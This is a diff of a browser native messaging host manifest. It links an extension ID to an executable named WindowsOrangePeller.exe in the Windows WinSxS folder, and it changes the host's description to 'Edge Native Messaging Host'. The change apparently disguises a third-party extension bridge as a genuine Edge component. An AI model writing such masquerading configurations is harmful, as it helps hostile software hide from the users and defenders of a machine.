@@ -1,9 +1,9 @@
 {
   "name": "com.launcher.agent",
-  "description": "Windows Orange Peller Host Service",
+  "description": "Edge Native Messaging Host",
   "path": "C:\\Windows\\WinSxS\\WindowsOrangePeller.exe",
   "type": "stdio",
   "allowed_origins": [
-    "chrome-extension://<CHROME_EKLENTI_ID_BURAYA>/"
+    "chrome-extension://jfnphkdpdjgokfnchpnlaekcgchlnfln/"
   ]
 }
